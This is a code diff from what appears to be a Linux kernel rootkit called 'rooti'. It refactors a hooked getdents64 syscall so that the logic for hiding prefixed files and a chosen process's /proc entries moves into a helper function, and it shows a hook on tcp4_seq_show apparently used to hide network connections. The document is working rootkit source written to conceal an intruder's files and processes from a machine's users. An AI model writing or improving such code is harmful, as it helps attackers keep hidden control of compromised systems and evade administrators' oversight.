@@ -196,56 +196,11 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
         return nread;
     }
 
-    // Allocate a kernel buffer to store the data returned to user
-    struct linux_dirent64 *kernel_buf = kmalloc(nread, GFP_KERNEL);
-    if (kernel_buf == NULL) {
-        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
-        return nread;
-    }
-
-    // Copy the return data of the syscall to our kernel buffer
-    int err = copy_from_user(kernel_buf, user_buf, nread);
-    if (err > 0) {
-        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
-        kfree(kernel_buf);
-        return nread;
-    }
-
     // Check if the directory FD is of /proc
     bool is_proc_dir = rooti_is_tracked_fd(fd, &rooti_proc_tracked_fds);
 
-    // Tamper with the returned records, concealing any files we wish to hide 
-    struct linux_dirent64 *curr_record = NULL;
-    struct linux_dirent64 *prev_record = NULL;
-    unsigned long offset = 0;
-    unsigned short prefix_length = strlen(ROOTI_HIDE_PREFIX);
-    while (offset < nread) {
-        curr_record = (void *)kernel_buf + offset;
-        // Check if the current file begins with the defined prefix, or if the filename is the PID of the process to hide
-        if (
-            (is_proc_dir && strncmp(curr_record->d_name, rooti_client_proc.name, NAME_MAX) == 0) ||
-            (strlen(curr_record->d_name) >= prefix_length && memcmp(curr_record->d_name, ROOTI_HIDE_PREFIX, prefix_length) == 0)
-        ) {
-            nread = rooti_filter_dir_entry(curr_record, prev_record, nread);
-            if (curr_record == kernel_buf) {
-                continue;
-            }
-        } else {
-            prev_record = curr_record;
-        }
-        offset += curr_record->d_reclen;
-    }
-
-    // Copy the rigged buffer back to userspace
-    err = copy_to_user(user_buf, kernel_buf, nread);
-    if (err > 0) {
-        printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
-        kfree(kernel_buf);
-        return nread;
-    }
-
-    kfree(kernel_buf);
-    return nread;
+    // Filter any files we wish to hide from the buffer
+    return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, rooti_client_proc.pid);
 }
 
 static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
